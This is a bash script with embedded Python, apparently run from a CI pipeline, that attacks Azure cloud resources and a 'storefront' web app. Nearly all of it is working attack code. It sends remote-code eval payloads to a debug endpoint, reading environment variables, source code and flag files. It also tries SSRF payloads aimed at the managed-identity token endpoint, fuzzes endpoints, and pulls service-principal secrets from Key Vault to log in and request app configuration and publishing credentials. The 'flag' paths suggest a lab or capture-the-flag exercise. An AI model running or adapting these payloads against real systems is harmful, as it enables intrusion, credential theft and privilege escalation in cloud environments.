#!/usr/bin/env bash
set -uo pipefail

TEN="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
PLATFORM_RG="rg-tbl-platform-prod-sea"

echo "=== BUILD55: DEBUG EVAL WITH ARMOWNER + ACR PULL + FUZZ ==="

# 1. Login as cicd-deployer
JWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')
az login --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" \
  --federated-token "$JWT" --allow-no-subscriptions -o none
echo "cicd-deployer OK"

# 2. Try ACR login and pull
echo "=== ACR PULL ATTEMPT ==="
az acr login --name crtblplatprodx3euoz 2>&1 | head -5
if docker pull crtblplatprodx3euoz.azurecr.io/tebamoto-reporting-api:latest 2>&1 | grep -q "Pull complete\|up to date\|already"; then
    echo "ACR PULL SUCCESS"
    docker run --rm --entrypoint cat crtblplatprodx3euoz.azurecr.io/tebamoto-reporting-api:latest /app/app.py 2>&1 | head -500
else
    echo "ACR PULL FAILED - trying alternate"
    # Try with containerregistry.azure.net resource
    python3 -c "
import subprocess, json, urllib.request, urllib.error, urllib.parse

r = subprocess.run(['az','account','get-access-token','--resource','https://containerregistry.azure.net','--query','accessToken','-o','tsv'],
  capture_output=True, text=True)
CR_TOK = r.stdout.strip()
print(f'cr_tok len={len(CR_TOK)}')

if len(CR_TOK) > 100:
    ACR = 'crtblplatprodx3euoz.azurecr.io'
    # Exchange for ACR refresh token
    exc_body = urllib.parse.urlencode({
        'grant_type': 'access_token_refresh_token',
        'service': ACR,
        'tenant': '3205c325-06a5-4171-9ce8-ffc5e6c2845e',
        'access_token': CR_TOK
    })
    try:
        exc_r = urllib.request.urlopen(urllib.request.Request(
            f'https://{ACR}/oauth2/exchange',
            data=exc_body.encode(),
            method='POST',
            headers={'Content-Type': 'application/x-www-form-urlencoded'}
        ), timeout=20)
        rt = json.loads(exc_r.read()).get('refresh_token','')
        print(f'acr_rt len={len(rt)}')

        if rt:
            # Get token for catalog
            tok_body = urllib.parse.urlencode({
                'grant_type': 'refresh_token',
                'service': ACR,
                'scope': 'registry:catalog:*',
                'refresh_token': rt
            })
            at_r = urllib.request.urlopen(urllib.request.Request(
                f'https://{ACR}/oauth2/token',
                data=tok_body.encode(), method='POST',
                headers={'Content-Type': 'application/x-www-form-urlencoded'}
            ), timeout=20)
            at = json.loads(at_r.read()).get('access_token','')
            cat = json.loads(urllib.request.urlopen(urllib.request.Request(
                f'https://{ACR}/v2/_catalog',
                headers={'Authorization': f'Bearer {at}'}
            ), timeout=20).read())
            print(f'acr_catalog: {cat}')
    except Exception as e:
        print(f'acr_cr_err: {e}')
"
fi

python3 -I << 'PYEOF'
import subprocess, json, urllib.request, urllib.error

# Get ArmOwner token
SYNC_APPID = "462d1c38-4459-48b8-9333-82e389e59514"
r = subprocess.run(['az','account','get-access-token','--resource',SYNC_APPID,'--query','accessToken','-o','tsv'],
  capture_output=True, text=True)
SYNC_TOK = r.stdout.strip()
print(f"SYNC_TOK len={len(SYNC_TOK)}")

r2 = subprocess.run(['az','account','get-access-token','--resource','https://management.azure.com','--query','accessToken','-o','tsv'],
  capture_output=True, text=True)
ARM = r2.stdout.strip()

STOREFRONT = "https://app-tbl-storefront-prod.azurewebsites.net"
FDID = "60407ff3-1c24-4875-9390-b6c9c13b0821"

def rq(url, tok, method="GET", data=None, extra_hdrs=None):
    h = {"Authorization":"Bearer "+tok}
    if extra_hdrs:
        h.update(extra_hdrs)
    if isinstance(data,(dict,list)):
        data = json.dumps(data).encode()
        h["Content-Type"] = "application/json"
    try:
        r = urllib.request.urlopen(urllib.request.Request(url,data=data,method=method,headers=h),timeout=30)
        return r.status, r.read().decode("utf-8","replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8","replace")[:3000]
    except Exception as e:
        return 0, str(e)[:300]

FDID_HDR = {"X-Azure-FDID": FDID}

if len(SYNC_TOK) > 100:
    print("\n=== DEBUG EVAL WITH ARMOWNER TOKEN ===")

    # Try eval with ArmOwner token - maybe restrictions are lifted!
    for expr in [
        "settings",
        "__import__('os').environ",
        "__import__('os').listdir('/')",
        "__import__('os').listdir('/app')",
        "open('/app/app.py').read()",
        "open('/etc/flag').read()",
        "open('/flag').read()",
        "open('/app/flag').read()",
        "__import__('os').popen('env').read()",
        "__import__('os').popen('ls /').read()",
        "__import__('os').popen('cat /app/app.py').read()",
        "__import__('os').popen('find / -name flag* 2>/dev/null').read()",
        "__import__('os').popen('find / -name \"*.txt\" -newer /app/app.py 2>/dev/null | head -20').read()",
        "__import__('subprocess').check_output(['env']).decode()",
        "__import__('subprocess').check_output(['cat','/app/app.py']).decode()",
    ]:
        s, b = rq(f"{STOREFRONT}/internal/debug", SYNC_TOK, "POST",
                  {"expr": expr}, FDID_HDR)
        if 'unsupported' not in b and 'not defined' not in b.lower():
            print(f"EXPR {expr[:50]}: {s} {b[:500]}")
        else:
            print(f"EXPR {expr[:50]}: {s} blocked")

    print("\n=== DEBUG EVAL WITHOUT TOKEN (compare) ===")
    for expr in ["settings", "__import__('os').environ"]:
        s, b = rq(f"{STOREFRONT}/internal/debug", "", "POST",
                  {"expr": expr}, FDID_HDR)
        print(f"NO_TOKEN {expr[:30]}: {s} {b[:300]}")

    print("\n=== FULL SHIPMENTS DATA ===")
    s, b = rq(f"{STOREFRONT}/api/v1/shipments", SYNC_TOK, extra_hdrs=FDID_HDR)
    print(f"shipments: {s} {b[:2000]}")

    # Try to inject URL into template via various params
    print("\n=== TEMPLATE SSRF INJECTION ATTEMPTS ===")
    MSI = "http://169.254.131.6:8081/msi/token?api-version=2019-08-01&resource=https://management.azure.com"
    for body in [
        {"template_id": "manifest", "destination": f"[port]({MSI})"},
        {"template_id": "shipment-summary", "tracking_url": MSI},
        {"template_id": "shipment-summary", "content": f"see [here]({MSI})"},
        {"template_id": "manifest", "content": f"[link]({MSI})"},
        {"template_id": "manifest", "data": {"url": MSI}},
        {"template_id": "shipment-summary", "order_id": "1", "webhook": MSI},
    ]:
        s, b = rq(f"{STOREFRONT}/api/v1/reports/render", SYNC_TOK, "POST", body, FDID_HDR)
        print(f"render {list(body.keys())[1:]}: {s} {b[:300]}")

    # Try the SSRF with CI runner's localhost or 127.0.0.1
    for body in [
        {"template_id": "manifest", "ssrf": "[x](http://127.0.0.1:8000/secret)"},
        {"template_id": "manifest", "ref": "[x](http://localhost:80/flag)"},
    ]:
        s, b = rq(f"{STOREFRONT}/api/v1/reports/render", SYNC_TOK, "POST", body, FDID_HDR)
        print(f"ssrf_test {list(body.keys())[1:]}: {s} {b[:300]}")

    # Enumerate more endpoints via fuzzing
    print("\n=== ENDPOINT FUZZ ===")
    for path in [
        "/healthz",
        "/api",
        "/api/v1",
        "/api/v2",
        "/api/v1/shipments/1",
        "/api/v1/reports",
        "/api/v1/reports/list",
        "/api/v1/reports/templates",
        "/api/v1/settings",
        "/api/v1/config",
        "/internal/settings",
        "/internal/env",
        "/internal/debug/exec",
        "/internal/platform",
        "/.well-known/openid-configuration",
        "/metrics",
        "/api/v1/admin",
        "/docs",
        "/openapi.json",
        "/swagger.json",
    ]:
        s, b = rq(f"{STOREFRONT}{path}", SYNC_TOK, extra_hdrs=FDID_HDR)
        if s not in [404, 405]:
            print(f"FOUND {path}: {s} {b[:300]}")
        else:
            print(f"{path}: {s}")

if len(ARM) > 100:
    # Check role assignments on storefront for each SP
    SUB = "c5e4e004-b42d-4ac4-a502-5fd338380eb6"
    PLATFORM_RG = "rg-tbl-platform-prod-sea"

    s, b = rq(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{PLATFORM_RG}/providers/Microsoft.Web/sites/app-tbl-storefront-prod/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01", ARM)
    print(f"\nstorefront_role_assignments: {s}:{b[:5000]}")

PYEOF

# Also check each SP's role on storefront
echo "=== CHECKING SP ROLES ON STOREFRONT ==="
for SECRET in "reporting-service-principal" "reporting-viewer-principal" "secrets-sync-principal" "cost-reader-principal"; do
    az keyvault secret show --vault-name kv-tbl-prod-x3euoz --name "$SECRET" \
      --query value -o tsv > /tmp/sp_${SECRET}.json 2>/dev/null

    python3 -I -c "
import subprocess, json, urllib.request, urllib.error
v = json.loads(open('/tmp/sp_${SECRET}.json').read().strip())
cid = v.get('appId','')
sec = v.get('clientSecret','')
r = subprocess.run(['az','login','--service-principal','-u',cid,'-p',sec,'--tenant','3205c325-06a5-4171-9ce8-ffc5e6c2845e','-o','none'],
  capture_output=True, text=True)
r2 = subprocess.run(['az','account','get-access-token','--resource','https://management.azure.com','--query','accessToken','-o','tsv'],
  capture_output=True, text=True)
ARM = r2.stdout.strip()
if len(ARM) < 100:
    print('${SECRET}: no ARM token')
else:
    # Check config/list on storefront
    h = {'Authorization':'Bearer '+ARM, 'Content-Type':'application/json'}
    try:
        r3 = urllib.request.urlopen(urllib.request.Request(
            'https://management.azure.com/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/list?api-version=2022-03-01',
            data=b'{}', method='POST', headers=h), timeout=20)
        print('${SECRET}: config_list 200 ' + r3.read().decode()[:500])
    except urllib.error.HTTPError as e:
        print('${SECRET}: config_list ' + str(e.code))
    # Check kudu
    try:
        r4 = urllib.request.urlopen(urllib.request.Request(
            'https://management.azure.com/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/publishingcredentials/list?api-version=2022-03-01',
            data=b'{}', method='POST', headers=h), timeout=20)
        print('${SECRET}: kudu_creds 200 ' + r4.read().decode()[:500])
    except urllib.error.HTTPError as e:
        print('${SECRET}: kudu_creds ' + str(e.code))
" 2>&1
done

echo "BUILD55 DONE"
